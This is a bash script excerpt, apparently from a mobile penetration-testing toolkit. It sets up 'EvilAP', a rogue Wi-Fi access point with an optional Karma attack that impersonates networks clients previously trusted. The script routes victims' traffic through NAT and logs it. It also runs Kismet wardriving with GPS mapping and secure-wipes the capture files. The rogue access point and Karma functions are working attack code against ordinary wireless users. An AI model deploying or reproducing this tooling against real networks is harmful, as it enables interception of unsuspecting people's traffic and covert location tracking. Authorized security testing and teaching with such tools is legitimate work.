f_evilap_stop_ap(){
clear
if [ -e "/opt/evilap.pid" ]; then
	echo "Shutting Down EvilAP"
	kill -KILL $(cat /opt/evilap.pid)
	if [ $? != 0 ]
        then
            echo "Unable to shutdown EvilAP"        
        else
            echo "EvilAP has been shutdown"
        fi
else
	echo "EvilAP does not appear to be running: evilap.pid was not found"
	sleep 3
fi
echo "Shutting down dnsmasq"
service dnsmasq stop
sleep 3
echo "Flushing IP tables"
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo "Bringing down wlan1"
ifconfig wlan1 down
echo "Bringing up wlan1"
ifconfig wlan1 up
sleep 5
}

f_evilap_start_ap(){
	EVIL_LOGNAME="/captures/evilap/evilap-$(date +%s).log"
	clear
	echo "Restarting wlan1"
	ifconfig wlan1 down

	sleep 2
	ifconfig wlan1 up
	ifconfig wlan1 10.0.0.1/24
	read -p "Enter an SSID name for Access Point: " EVIL_SSID
	echo "Using $EVIL_SSID as SSID"
		if [ -z $EVIL_SSID ]; then
			EVIL_SSID=default
			echo "Using default as SSID"
		fi
	echo "Setting iptables"
	iptables -t nat -F
	iptables -F
	iptables -t nat -A POSTROUTING -o $INT_EVIL_INTERNET -j MASQUERADE
	iptables -A FORWARD -i wlan1 -o $INT_EVIL_INTERNET -j ACCEPT
	# remove previous hostapd
	rm /etc/hostapd/evilhostapd.conf
	# check for karma option
	clear
	echo "Karma enabled will cause your AP to pretend to be any clients previous associated AP"
	echo ""
	read -p "Enable Karma? (y/n)" karma
	if [ "$karma" == "y" ]; then
	cat <<EOF > /etc/hostapd/evilhostapd.conf
interface=wlan1
driver=nl80211
ssid=$EVIL_SSID
channel=1
# Yes, we support the Karma attack.
enable_karma=1
EOF
	else
	cat <<EOF > /etc/hostapd/evilhostapd.conf
interface=wlan1
driver=nl80211
ssid=$EVIL_SSID
channel=1
# Yes, we support the Karma attack.
#enable_karma=1
EOF
	fi
	echo "Staring dnsmasq (DNS server)"
	service dnsmasq start
	echo "Starting hostapd (AP)"
	echo ""
	echo "CTRL-C will return you to the main menu but hostapd will continue to run."
	sleep 3
	hostapd -d -P /opt/evilap.pid /etc/hostapd/evilhostapd.conf > $EVIL_LOGNAME 2>&1 & 
}

# This is where EvilAP launches the menu
f_evilap_check
f_evilap_menu
}

f_kismet(){
#!/bin/bash
echo "Make sure BlueNMEA is running before starting with GPS support"
sleep 3
read -p "Would you like to run Kismet with GPS enabled? (y/n)" CONT
if [ "$CONT" == "y" ]; then
	(socat TCP:127.0.0.1:4352 PTY,link=/tmp/gps & gpsd /tmp/gps) & kismet -g;
	killall gpsd
	f_giskismet;
	wipe -f -P 5 /tmp/gps
else
  echo "Running Kismet WITHOUT GPS support..."
  sleep 2
  kismet -g;
  clear
fi
}

f_giskismet(){

# create database folder or check if one exsists
if [ ! -d "/captures/kismet_db" ]; then
	mkdir -p "/captures/kismet_db"
fi
# process all netxml files
cd /captures/kismet/
for capture in $(find . -iname '*.netxml'); do
echo "Adding $capture to datbase"
sleep 5
giskismet -x "$capture" --database "/captures/kismet_db/wireless.dbl"
done
# export kml of all wireless data and copy files to sdcard
giskismet --database "/opt/pwnpad/captures/kismet_db/wireless.dbl" -q "select * from wireless" -o "/captures/kismet/kismet-$NOW.kml"
echo "Created kismet-$NOW.kml file for Google Earth"
cd /sdcard/
zip -rj "kismet-captures-$NOW.zip" /captures/kismet/
echo "Successfully copied to /sdcard/kismet-captures-$NOW.zip"
# option to erase files
read -p "Would you like to secure erase all files in Kismet folder? (y/n)" CONT
if [ "$CONT" == "y" ]; then
	echo "Removing capture files..."
	wipe -f -i -r /captures/kismet/*
else
  echo "All files copied successfully!";
fi
}
